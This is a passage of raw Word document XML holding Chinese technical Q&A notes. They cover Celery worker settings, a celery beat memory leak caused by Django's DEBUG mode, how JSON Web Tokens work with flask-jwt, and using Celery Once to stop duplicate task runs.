          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  　　　　CELERYD_FORCE_EXECV = True    # 非常重要,有些情况下可以防止死锁  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AD3BF00" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　  CELERYD_MAX_TASKS_PER_CHILD = 100    # 每个worker最多执行万100个任务就会被销毁，可防止内存泄露  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68532FCD" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　  CELERYD_TASK_TIME_LIMIT = 60    # 单个任务的运行时间不超过此值，否则会被SIGKILL 信号杀死   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5DAC47" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  　　任务发出后，经过一段时间还未收到acknowledge , 就将任务重新交给其他worker执行 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56A713B5" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　  　　CELERY_DISABLE_RATE_LIMITS = True </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62ABE084" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> 在Django中使用celery内存泄漏问题？   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D11904" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　  在django下使用celery作为异步任务系统，十分方便。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB9B254" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>  　　同时celery也提供定时任务机制，celery beat。使用celery beat 可以为我们提供 cron，schedule 形式的定时任务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44FB0E5E" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  　　在django下使用celery beat的过程中，发现了 celery beat进程 占用内存非常大，而且一直不释放。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E62FB6C" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  　　怀疑其有内存占用不释放的可能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66543ED1" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  　　因为之前使用django的时候，就知道在django中开启DEBUG模式，会为每次的SQL查询 缓存结果。   celery beat 作为 定时任务的timer和heartbeat程序，是长期运行的，而我使用了MYSQL作为存储定时任务的backend。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FAB702" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　  因为每次heartbeat和timer产生的sql查询在开启了DEBUG模式下的django环境中，都会缓存查询结果集。因此 celery beat占用的 内存会一直不释放。在我的线上环境中 达到10G内存占用！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01573530" w14:textId="4C0131D0" w:rsidR="00191162" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>     　 解决： 关掉django的DEBUG模式，在setting中，设置DEBUG=False 即可。   关闭DEBUG模式后的celery beat程序 的内存占用大概 一直维持在150M左右。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E62FAC" w14:textId="23ECBC51" w:rsidR="00DA6011" w:rsidRPr="00CF0D9D" w:rsidRDefault="00082DE9"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154</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00DA6011" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>flask</w:t>
      </w:r>
      <w:r w:rsidR="00DA6011" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidR="00DA6011" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>jwt?  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BFB74C" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　一篇文章需求分析：(Flask + flask-jwt 实现基于Json Web Token的用户认证授权)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E7A1F9" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> 　　jwt是flask的一个第三方库：flask-jwt--------&gt;可以实现基于Json Web Token的用户认证授权</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="513D8C3F" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　 使用 JWT 让你的 RESTful API 更安全  什么是 JWT ？   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="413A2EF8" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　JWT 及时 JSON Web Token，它是基于 RFC 7519 所定义的一种在各个系统中传递紧凑和自包含的 JSON 数据形式。   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7028BC7A" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　紧凑（Compact） ：由于传送的数据小，JWT 可以通过GET、POST 和 放在 HTTP 的 header 中，同时也是因为小也能传送的更快。   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D39319" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　自包含（self-contained） : Payload 中能够包含用户的信息，避免数据库的查询。  JSON Web Token 由三部分组成使用 .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BF0CD0" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　分割开：   Header   Payload   Signature     一个 JWT 形式上类似于下面的样子：   xxxxx.yyyy.zzzz     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C5B3C2A" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　Header 一般由两个部分组成：   alg   typ     alg 是是所使用的 hash 算法例如 HMAC SHA256 或 RSA，typ 是 Token 的类型自然就是 JWT。   {     "alg": "HS256",     "typ": "JWT"   }         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131FDE5E" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　JSON Web Token 的工作流程： </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A2898D" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> 　　　　在用户使用证书或者账号密码登入的时候一个 JSON Web Token 将会返回，同时可以把这个 JWT 存储在local storage、或者 cookie 中，用来替代传统的在服务器端创建一个 session 返回一个 cookie。  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E83B20D" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> 　　　　当用户想要使用受保护的路由时候，应该要在请求得时候带上 JWT ，一般的是在 header 的 Authorization 使用 Bearer 的形式，一个包含的 JWT 的请求头的 Authorization 如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D526FAB" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> 　　　　　   Authorization: Bearer &lt;token&gt;  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E92CFE2" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　 这是一中无状态的认证机制，用户的状态从来不会存在服务端，在访问受保护的路由时候回校验 HTTP header 中 Authorization 的 JWT，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="013DE600" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　同时 JWT 是会带上一些必要的信息，不需要多次的查询数据库。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EAD39C2" w14:textId="77777777" w:rsidR="00DA6011" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　这种无状态的操作可以充分的使用数据的 APIs，甚至是在下游服务上使用，这些 APIs 和哪服务器没有关系，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C69BCD" w14:textId="117524F2" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00DA6011" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　　　因此，由于没有 cookie 的存在，所以在不存在跨域（CORS, Cross-Origin Resource Sharing）的问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55827A39" w14:textId="0968B85B" w:rsidR="00F22DDC" w:rsidRPr="00CF0D9D" w:rsidRDefault="00082DE9"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155</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00F22DDC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>celery</w:t>
      </w:r>
      <w:r w:rsidR="00F22DDC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>在某一时刻突然执行</w:t>
      </w:r>
      <w:r w:rsidR="00F22DDC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00F22DDC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>回</w:t>
      </w:r>
      <w:r w:rsidR="00F22DDC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">? </w:t>
      </w:r>
      <w:r w:rsidR="00F22DDC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>为什么</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？如果</w:t>
      </w:r>
      <w:r w:rsidR="00F22DDC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>否</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>该</w:t>
      </w:r>
      <w:r w:rsidR="00F22DDC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>怎么解决？</w:t>
      </w:r>
      <w:r w:rsidR="00F22DDC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0997C6F6" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D60F18">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　</w:t>
      </w:r>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　Celery是一个用Python开发的异步的分布式任务调度模块    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB86E36" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　网友遇到的工作问题以及解决方案：   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2468D2DA" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">　　　　使用 Celery Once 来防止 Celery 重复执行同一个任务   在使用 Celery 的时候发现有的时候 Celery 会将同一个任务执行两遍，我遇到的情况是相同的任务在不同的 worker 中被分别执行，并且时间只相差几毫秒。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="646DC8BD" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　这问题我一直以为是自己哪里处理的逻辑有问题，后来发现其他人 也有类似的问题，然后基本上出问题的都是使用 Redis 作为 Broker 的，而我这边一方面不想将 Redis 替换掉，就只能在 task 执行的时候加分布式锁了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BAE8CE" w14:textId="77777777" w:rsidR="00F22DDC" w:rsidRPr="00D92594" w:rsidRDefault="00F22DDC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  　　　 不过在 Celery 的 issue 中搜索了一下，有人使用 Redis 实现了分布式锁，然后也有人使用了 Celery Once。 大致看了一下 Celery Once ，发现非常符合现在的情况，就用了下。</w:t>
      </w:r>
    </w:p>
